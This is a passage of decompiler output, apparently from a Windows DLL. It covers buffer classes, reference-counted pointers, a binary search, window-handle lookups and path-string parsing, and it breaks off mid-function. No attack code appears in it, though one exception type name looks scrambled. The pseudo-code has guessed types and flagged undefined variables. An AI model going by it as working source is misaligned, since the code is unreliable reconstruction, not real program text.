//----- (10008065) --------------------------------------------------------
int __thiscall sub_10008065(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10008089) --------------------------------------------------------
BOOL __thiscall sub_10008089(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10008094) --------------------------------------------------------
int __thiscall sub_10008094(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_BYTE *)(i + this[3]) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (100080D3) --------------------------------------------------------
unsigned int __thiscall sub_100080D3(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v7; // edx
  int *v8; // ecx
  unsigned int v9; // [esp+18h] [ebp+Ch]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008EE5F);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v9 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v9 >= a2 )
      {
        v7 = *a4;
        v8 = a4;
      }
      else
      {
        v7 = *a3;
        v8 = a3;
      }
      (*(void (__thiscall **)(int *, unsigned int))(v7 + 36))(v8, v9 + this[3]);
      ++v9;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v9 < result );
  }
  return result;
}

//----- (10008146) --------------------------------------------------------
unsigned int __thiscall sub_10008146(void *this, unsigned int pExceptionObject, int a3)
{
  unsigned int result; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject >= result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (1000816E) --------------------------------------------------------
unsigned int __stdcall sub_1000816E(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (1000817F) --------------------------------------------------------
unsigned int __thiscall sub_1000817F(_DWORD *this, int a2, int a3, int a4)
{
  size_t v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_BYTE *)(v6 + this[3]) = *(_BYTE *)(v6 + a3);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (100081CE) --------------------------------------------------------
void __thiscall sub_100081CE(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebp
  _BYTE *v7; // ebx
  _BYTE *v8; // edi
  int v9; // ebp
  unsigned int v10; // [esp+Ch] [ebp-Ch]
  int Size; // [esp+10h] [ebp-8h]
  void *Block; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      Size = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      Size = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v10 = 0;
    v7 = operator new(Size);
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = v7;
      v9 = (_BYTE *)v6 - v7;
      do
      {
        ++v10;
        *v8 = v8[v9];
        ++v8;
      }
      while ( v10 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v7;
    j__free(Block);
    this[2] = Size;
  }
}

//----- (10008279) --------------------------------------------------------
void *__thiscall sub_10008279(_DWORD *this)
{
  *this = &off_1007307C;
  sub_10007EEF((int)(this + 5));
  sub_100022C5(this + 1);
  return sub_10007172(this);
}
// 1007307C: using guessed type int (__thiscall *off_1007307C)(void *Block, char);

//----- (100082CB) --------------------------------------------------------
bool __thiscall sub_100082CB(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  bool result; // al

  v3 = sub_10008871(this, a2);
  result = 0;
  if ( v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3);
    if ( !sub_1000A1C0(a2, v4) )
      return 1;
  }
  return result;
}

//----- (10008308) --------------------------------------------------------
char __thiscall sub_10008308(_DWORD *this, int a2)
{
  int v3; // ebx
  int v4; // eax

  v3 = sub_10008871(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    return 0;
  v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3);
  if ( sub_1000A1C0(a2, v4) )
    return 0;
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1000835A) --------------------------------------------------------
int __thiscall sub_1000835A(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  int v5; // eax

  v3 = sub_10008871(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), sub_1000A1C0(a2, v4)) )
  {
    (*(void (__thiscall **)(_DWORD *, int, int))(this[1] + 32))(this + 1, a2, v3);
    v5 = this[5];
    HIBYTE(a2) = 0;
    (*(void (__thiscall **)(_DWORD *, char *, int))(v5 + 32))(this + 5, (char *)&a2 + 3, v3);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}

//----- (100083B9) --------------------------------------------------------
int __thiscall sub_100083B9(_DWORD *this, int pExceptionObject)
{
  int v3; // esi
  int v4; // eax

  v3 = sub_10008871(this, pExceptionObject);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3), sub_1000A1C0(pExceptionObject, v4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v3);
}

//----- (10008413) --------------------------------------------------------
_DWORD *__thiscall sub_10008413(_DWORD *this, _DWORD *a2)
{
  sub_100021D4(this + 1, a2);
  return a2;
}

//----- (1000844B) --------------------------------------------------------
_DWORD *__thiscall sub_1000844B(_DWORD *this, _DWORD *a2)
{
  sub_100087D2(this + 5, a2);
  return a2;
}

//----- (10008483) --------------------------------------------------------
int __thiscall sub_10008483(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (1000849B) --------------------------------------------------------
int __thiscall sub_1000849B(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 52))(this + 5);
}

//----- (100084AF) --------------------------------------------------------
int __thiscall sub_100084AF(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 64))(this + 1);
}

//----- (100084B7) --------------------------------------------------------
_DWORD *__stdcall sub_100084B7(_DWORD *a1)
{
  *a1 = &off_10072FE8;
  sub_10008826(a1 + 1);
  return a1;
}
// 10072FE8: using guessed type int (__thiscall *off_10072FE8)(void *Block, char);

//----- (100084E9) --------------------------------------------------------
void *__thiscall sub_100084E9(_DWORD *this)
{
  *this = &off_10072FE8;
  return sub_10008279(this + 1);
}
// 10072FE8: using guessed type int (__thiscall *off_10072FE8)(void *Block, char);

//----- (10008515) --------------------------------------------------------
int __thiscall sub_10008515(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 8))(this + 1);
}

//----- (1000851D) --------------------------------------------------------
BOOL __thiscall sub_1000851D(_DWORD *this, int a2)
{
  char v3; // bl

  v3 = (*(int (__thiscall **)(_DWORD *, int))(*this + 4))(this, a2);
  *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, a2) = 1;
  return v3 == 0;
}

//----- (1000854F) --------------------------------------------------------
int __thiscall sub_1000854F(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, a2);
  return a2;
}

//----- (10008585) --------------------------------------------------------
int __thiscall sub_10008585(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 32))(this + 1, a2);
  return a2;
}

//----- (100085BB) --------------------------------------------------------
int __thiscall sub_100085BB(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
}

//----- (100085C3) --------------------------------------------------------
int __thiscall sub_100085C3(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 24))(this + 1);
}

//----- (100085CB) --------------------------------------------------------
int __thiscall sub_100085CB(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 28))(this + 1);
}

//----- (100085E7) --------------------------------------------------------
_DWORD *__userpurge sub_100085E7@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1000862B) --------------------------------------------------------
void __thiscall sub_1000862B(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000890A((int)this);
}

//----- (1000866A) --------------------------------------------------------
_DWORD *__userpurge sub_1000866A@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (100086AE) --------------------------------------------------------
void __thiscall sub_100086AE(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10008932((int)this);
}

//----- (100086FB) --------------------------------------------------------
_DWORD *__userpurge sub_100086FB@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1000873F) --------------------------------------------------------
void __thiscall sub_1000873F(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000896C((int)this);
}

//----- (1000877E) --------------------------------------------------------
void *__thiscall sub_1000877E(void *Block, char a2)
{
  sub_10007EEF((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000879A) --------------------------------------------------------
_DWORD *__thiscall sub_1000879A(_DWORD *Block, char a2)
{
  sub_10008279(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100087B6) --------------------------------------------------------
_DWORD *__thiscall sub_100087B6(_DWORD *Block, char a2)
{
  sub_100084E9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100087D2) --------------------------------------------------------
_DWORD *__userpurge sub_100087D2@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  int v5; // [esp-4h] [ebp-14h]

  sub_100089C3(a2);
  *a2 = &off_100730B8;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1000817F(a2, v2, v4, v5);
  return a2;
}
// 100730B8: using guessed type int (__thiscall *off_100730B8)(void *Block, char);

//----- (10008826) --------------------------------------------------------
_DWORD *__stdcall sub_10008826(_DWORD *a1)
{
  sub_10008994(a1);
  *a1 = &off_1007307C;
  sub_10002228(a1 + 1, 0x10u);
  sub_100089F2(a1 + 5);
  return a1;
}
// 1007307C: using guessed type int (__thiscall *off_1007307C)(void *Block, char);

//----- (10008871) --------------------------------------------------------
int __userpurge sub_10008871@<eax>(_DWORD *a1@<edi>, int a2)
{
  int v2; // esi
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v7; // [esp+4h] [ebp-8h]
  int v8; // [esp+8h] [ebp-4h]

  v8 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v7 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v7 )
        break;
      v3 = (*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2);
      if ( !sub_1000A1C0(v3, a2) )
        break;
      v4 = (*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2);
      if ( sub_1000A1A2(v4, a2) )
      {
        v7 = v2;
        v5 = v2 + v8;
      }
      else
      {
        v8 = v2;
        v5 = v7 + v2 + 1;
      }
      v2 = v5 / 2;
    }
    while ( v5 / 2 > v8 );
  }
  if ( v2 == v8 )
    return v8 + 1;
  return v2;
}

//----- (1000890A) --------------------------------------------------------
void __usercall sub_1000890A(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10008932) --------------------------------------------------------
void __usercall sub_10008932(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000896C) --------------------------------------------------------
void __usercall sub_1000896C(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10008994) --------------------------------------------------------
_DWORD *__stdcall sub_10008994(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_1007300C;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 1007300C: using guessed type int (__thiscall *off_1007300C)(void *Block, char);

//----- (100089C3) --------------------------------------------------------
_DWORD *__stdcall sub_100089C3(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_10073114;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10073114: using guessed type int (__thiscall *off_10073114)(void *Block, char);

//----- (100089F2) --------------------------------------------------------
_DWORD *__stdcall sub_100089F2(_DWORD *a1)
{
  size_t i; // eax

  sub_100089C3(a1);
  *a1 = &off_100730B8;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  sub_10008A48(i, a1);
  return a1;
}
// 100730B8: using guessed type int (__thiscall *off_100730B8)(void *Block, char);

//----- (10008A48) --------------------------------------------------------
void *__usercall sub_10008A48@<eax>(size_t a1@<eax>, _DWORD *a2@<esi>)
{
  void *result; // eax

  a2[1] = 0;
  a2[2] = a1;
  result = operator new(a1);
  a2[3] = result;
  return result;
}

//----- (10008A5A) --------------------------------------------------------
void __cdecl sub_10008A5A(HWND hWndParent)
{
  int v1; // [esp+0h] [ebp-2Ch] BYREF
  int v2[5]; // [esp+Ch] [ebp-20h] BYREF
  int v3; // [esp+28h] [ebp-4h]

  v2[4] = (int)&v1;
  v3 = 0;
  sub_10004D35(v2, hWndParent);
  LOBYTE(v3) = 1;
  sub_100044E6(v2);
  LOBYTE(v3) = 0;
  sub_10004F0F(v2);
}

//----- (10008AC0) --------------------------------------------------------
_DWORD *__usercall sub_10008AC0@<eax>(_DWORD *a1@<edi>)
{
  *a1 = &off_100731CC;
  sub_10009590((LPARAM)&dword_100954D8, 0);
  return a1;
}
// 100731CC: using guessed type int (*off_100731CC)();
// 100954D8: using guessed type int dword_100954D8;

//----- (10008AF4) --------------------------------------------------------
void __cdecl sub_10008AF4(HWND hWndParent)
{
  if ( !sub_10008B79(&hWndParent) )
    sub_10008A5A(hWndParent);
}

//----- (10008B1B) --------------------------------------------------------
void *sub_10008B1B()
{
  _DWORD v1[4]; // [esp+8h] [ebp-1Ch] BYREF
  int v2; // [esp+20h] [ebp-4h]

  sub_10004E9B(v1);
  v2 = 0;
  sub_10009590((LPARAM)v1, (LPARAM)sub_10008AF4);
  sub_10005D44((int)v1, (int)&dword_100954D8);
  v2 = -1;
  return sub_10004ECE(v1);
}
// 100954D8: using guessed type int dword_100954D8;
// 10008B1B: using guessed type _DWORD var_1C[4];

//----- (10008B79) --------------------------------------------------------
char __stdcall sub_10008B79(_DWORD *a1)
{
  char v1; // bl
  int v3[2]; // [esp+8h] [ebp-14h] BYREF
  int v4; // [esp+18h] [ebp-4h]

  (*(void (__thiscall **)(int *, int *))(dword_100954D8 + 8))(&dword_100954D8, v3);
  v1 = 0;
  v4 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v3[0] + 4))(v3[0]) )
  {
    if ( *(_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v3[0] + 12))(v3[0]) == *a1 )
    {
      v1 = 1;
      break;
    }
    sub_10005E1C((int)a1, v3[0]);
  }
  v4 = -1;
  sub_1000696F(v3);
  return v1;
}
// 100954D8: using guessed type int dword_100954D8;

//----- (10008BE6) --------------------------------------------------------
_DWORD *__stdcall sub_10008BE6(_DWORD *a1)
{
  _DWORD *v1; // eax
  int v2; // ecx
  _DWORD *v3; // eax
  int v5; // [esp-8h] [ebp-20h] BYREF
  _DWORD *v6; // [esp-4h] [ebp-1Ch]
  void *Block; // [esp+8h] [ebp-10h]
  int v8; // [esp+14h] [ebp-4h]

  sub_10006F72(a1);
  v8 = 0;
  v6 = a1 + 21;
  *a1 = &off_100731D4;
  sub_100091F2((int)v6);
  v1 = operator new(8u);
  v2 = (int)v6;
  Block = v1;
  LOBYTE(v8) = 1;
  if ( v1 )
    v3 = sub_1001CC57(v1);
  else
    v3 = 0;
  LOBYTE(v8) = 0;
  v6 = (_DWORD *)v2;
  v5 = v2;
  Block = &v5;
  sub_10009175(&v5, (int)v3);
  LOBYTE(v8) = 0;
  sub_1001DDFF((_DWORD *)dword_10091D5C, v5, (int)v6);
  return a1;
}
// 10008C30: variable 'v2' is possibly undefined
// 100731D4: using guessed type int (*off_100731D4)();
// 10091D5C: using guessed type int dword_10091D5C;

//----- (10008C66) --------------------------------------------------------
_DWORD *__thiscall sub_10008C66(_DWORD *Block, char a2)
{
  sub_10008C82(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10008C82) --------------------------------------------------------
void *__thiscall sub_10008C82(_DWORD *this)
{
  *this = &off_100731D4;
  return sub_10006FD4(this);
}
// 100731D4: using guessed type int (*off_100731D4)();

//----- (10008CAB) --------------------------------------------------------
void __usercall sub_10008CAB(int *a1@<esi>)
{
  unsigned int ShortPathNameW; // eax
  int v2; // [esp+4h] [ebp-14h] BYREF
  int v3; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+14h] [ebp-4h]

  sub_1000B9EF(&v2);
  v4 = 0;
  sub_1000A02D(&v2);
  ShortPathNameW = GetShortPathNameW(*(LPCWSTR *)(a1[1] + 12), *(LPWSTR *)(v3 + 12), 0x104u);
  if ( ShortPathNameW )
  {
    sub_1000A8F8(ShortPathNameW, &v2);
    sub_100021B1(&v3, a1 + 1);
  }
  sub_1000A531(a1);
  v4 = -1;
  sub_1000BA51(&v2);
}

//----- (10008D2C) --------------------------------------------------------
char __stdcall sub_10008D2C(int a1, int a2)
{
  int v2; // eax
  int v3; // esi
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v6; // eax
  int v7; // esi
  int v9; // [esp+0h] [ebp-80h] BYREF
  int v10[5]; // [esp+Ch] [ebp-74h] BYREF
  int v11[5]; // [esp+20h] [ebp-60h] BYREF
  int pExceptionObject; // [esp+34h] [ebp-4Ch] BYREF
  int v13[2]; // [esp+38h] [ebp-48h] BYREF
  int v14; // [esp+40h] [ebp-40h] BYREF
  int v15; // [esp+44h] [ebp-3Ch] BYREF
  int v16[2]; // [esp+48h] [ebp-38h] BYREF
  int v17[2]; // [esp+50h] [ebp-30h] BYREF
  int v18; // [esp+58h] [ebp-28h] BYREF
  int v19; // [esp+5Ch] [ebp-24h] BYREF
  int v20; // [esp+60h] [ebp-20h] BYREF
  int v21; // [esp+64h] [ebp-1Ch] BYREF
  int v22; // [esp+68h] [ebp-18h] BYREF
  int v23[2]; // [esp+6Ch] [ebp-14h] BYREF
  int v24; // [esp+7Ch] [ebp-4h]

  v23[1] = (int)&v9;
  v24 = 0;
  sub_1000BA21(&v22, (int)&a1);
  LOBYTE(v24) = 1;
  v2 = sub_1000BB4C((int)&v22);
  sub_100021B1((int *)(v2 + 4), v23);
  v3 = sub_1000A996((int)&v22, 0x23u);
  sub_1000B9A0(&v18, &word_1008FA6C);
  LOBYTE(v24) = 2;
  sub_1000B9A0(&v20, &word_1008FA70);
  LOBYTE(v24) = 3;
  if ( v3 == -1 )
  {
    sub_100021B1(v23, &v21);
  }
  else
  {
    v4 = sub_1000A3E9((int)&v22, 0, v13, v3);
    LOBYTE(v24) = 4;
    sub_1000BA21(&v14, (int)v4);
    LOBYTE(v24) = 5;
    sub_100021B1(&v15, &v21);
    LOBYTE(v24) = 4;
    sub_1000BA51(&v14);
    LOBYTE(v24) = 3;
    sub_10009F65(v13);
    v5 = sub_1000A3E9((int)&v22, v3 + 1, v13, 0xFFFFFFFE);
    LOBYTE(v24) = 6;
    sub_1000BA21(&v14, (int)v5);
    LOBYTE(v24) = 7;
    sub_100021B1(&v15, &v19);
    LOBYTE(v24) = 6;
    sub_1000BA51(&v14);
    LOBYTE(v24) = 3;
    sub_10009F65(v13);
    sub_10008CAB(&v18);
  }
  v6 = sub_1000A996((int)&v20, 0x5Cu);
  v7 = v6;
  if ( v6 == -1 )
  {
    LOBYTE(v24) = 2;
    sub_1000BA51(&v20);
    LOBYTE(v24) = 1;
    sub_1000BA51(&v18);
    LOBYTE(v24) = 0;
    goto LABEL_17;
  }
  sub_1000A3E9((int)&v20, 0, v16, v6);
  LOBYTE(v24) = 8;
  sub_1000A3E9((int)&v20, v7 + 1, v17, 0xFFFFFFFE);
  LOBYTE(v24) = 9;
  if ( *(_DWORD *)(v16[1] + 28) )
  {
    LOBYTE(v24) = 10;
    sub_1001DD41(&pExceptionObject, (int)v16);
    LOBYTE(v24) = 11;
    if ( *(_DWORD *)(v17[1] + 28) || *(_DWORD *)(v19 + 28) )
    {
      sub_1001E30F((int)&pExceptionObject, v11, (int)v17);
      LOBYTE(v24) = 12;
      if ( *(_DWORD *)(v19 + 28) )
      {
        sub_1001C4C8(v11, &v14);
        LOBYTE(v24) = 14;
        if ( sub_1000A1C0((int)&v14, (int)&v18) )
        {
          LOBYTE(v24) = 12;
          sub_10009F65(&v14);
          LOBYTE(v24) = 11;
          sub_1001C2B3(v11);
          LOBYTE(v24) = 10;
          sub_1001DFCF(&pExceptionObject);
          goto LABEL_6;
        }
        LOBYTE(v24) = 12;
        sub_10009F65(&v14);
      }
      else
      {
        sub_1001C3A6(v11, (int)v10);
        LOBYTE(v24) = 12;
        sub_1000C45D(v10);
      }
      LOBYTE(v24) = 11;
      sub_1001C2B3(v11);
    }
    LOBYTE(v24) = 10;
    sub_1001DFCF(&pExceptionObject);
    v24 = 8;
    sub_10009F65(v17);
    LOBYTE(v24) = 3;
    sub_10009F65(v16);
    LOBYTE(v24) = 2;
    sub_1000BA51(&v20);
    LOBYTE(v24) = 1;
    sub_1000BA51(&v18);
    LOBYTE(v24) = 0;
    sub_1000BA51(&v22);
    v24 = -1;
    sub_10009F65(&a1);
    return 1;
  }
LABEL_6:
  LOBYTE(v24) = 8;
  sub_10009F65(v17);
  LOBYTE(v24) = 3;
  sub_10009F65(v16);
  LOBYTE(v24) = 2;
  sub_1000BA51(&v20);
  LOBYTE(v24) = 1;
  sub_1000BA51(&v18);
  LOBYTE(v24) = 0;
LABEL_17:
  sub_1000BA51(&v22);
  v24 = -1;
  sub_10009F65(&a1);
  return 0;
}
// 10008D2C: using guessed type int var_74[5];

//----- (1000903A) --------------------------------------------------------
void __thiscall sub_1000903A(void *this, int a2, int a3)
{
  int v3; // [esp-8h] [ebp-28h] BYREF
  int v4; // [esp-4h] [ebp-24h]
  int v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v6 = 0;
  v4 = (int)this;
  v3 = (int)this;
  v5[4] = (int)&v3;
  sub_10009F32(&v3, (int)&a2);
  LOBYTE(v6) = 0;
  sub_10006ABE(v5, v3, v4);
  LOBYTE(v6) = 2;
  sub_100044E6(v5);
  LOBYTE(v6) = 0;
  sub_10006B31(v5);
  v6 = -1;
  sub_10009F65(&a2);
}

//----- (100090A1) --------------------------------------------------------
_DWORD *__stdcall sub_100090A1(_DWORD *a1)
{
  int v2[30]; // [esp+8h] [ebp-98h] BYREF
  int v3[4]; // [esp+80h] [ebp-20h] BYREF
  int v4; // [esp+90h] [ebp-10h]
  int v5; // [esp+9Ch] [ebp-4h]

  v4 = 0;
  sub_100035BB();
  sub_100016F0(dword_10091C08, v2);
  v5 = 1;
  sub_100021D4(v3, a1);
  v4 = 1;
  LOBYTE(v5) = 0;
  sub_100010A5(v2);
  return a1;
}
// 10091C08: using guessed type int dword_10091C08;
// 100090A1: using guessed type int var_98[30];
// 100090A1: using guessed type int var_20[4];

//----- (10009105) --------------------------------------------------------
void *__thiscall sub_10009105(_DWORD *this)
{
  void *result; // eax
  void *v2; // esi
  _DWORD v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  result = &loc_10061114;
  v3[3] = v3;
  *this = off_100731E8;
  v3[6] = 0;
  v2 = (void *)this[1];
  if ( v2 )
    return sub_10009165(v2);
  return result;
}
// 100731E8: using guessed type int (__thiscall *off_100731E8[2])(void *Block, char);

//----- (10009149) --------------------------------------------------------
_DWORD *__thiscall sub_10009149(_DWORD *Block, char a2)
{
  sub_10009105(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10009165) --------------------------------------------------------
void *__usercall sub_10009165@<eax>(void *a1@<esi>)
{
  void *v2; // [esp+0h] [ebp-4h]

  sub_1001DD21(v2);
  j__free(a1);
  return a1;
}
// 10009166: variable 'v2' is possibly undefined

//----- (10009175) --------------------------------------------------------
_DWORD *__userpurge sub_10009175@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (100091B9) --------------------------------------------------------
void __thiscall sub_100091B9(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10009204((int)this);
}

//----- (100091F2) --------------------------------------------------------
int __stdcall sub_100091F2(int a1)
{
  sub_1000922C();
  return a1;
}

//----- (10009204) --------------------------------------------------------
void __usercall sub_10009204(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000922C) --------------------------------------------------------
int sub_1000922C()
{
  int v0; // ecx
  int result; // eax
  _DWORD *v2; // eax
  int v3; // ecx
  _DWORD v4[2]; // [esp+0h] [ebp-18h] BYREF
  void *Block; // [esp+8h] [ebp-10h] BYREF
  int v6; // [esp+14h] [ebp-4h]

  v0 = dword_10091D5C;
  result = _InterlockedExchange((volatile __int32 *)&Block, (__int32)&loc_10064B33);
  if ( !v0 )
  {
